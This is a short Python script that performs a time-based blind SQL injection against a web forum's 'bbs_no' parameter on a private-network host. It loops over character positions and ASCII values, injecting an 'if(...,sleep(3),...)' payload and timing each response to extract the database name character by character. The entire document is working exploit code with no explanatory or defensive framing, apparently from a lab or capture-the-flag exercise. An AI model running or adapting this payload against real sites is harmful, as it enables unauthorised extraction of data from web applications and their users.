#-*- coding:utf-8 -*-
import requests,time
result=''
for y in range(1,11):
    for x in range(1, 128):
        t1 = time.time()
        url = "http://192.168.15.132:5000/main/view?bbs_no=20 and if(ascii(substr(database(),{},1))={},sleep(3),20)".format(y,x)    
        res=requests.get(url)
        t2 = time.time()        
        if (t2-t1) > 2:
            result += chr(x)
print result
    
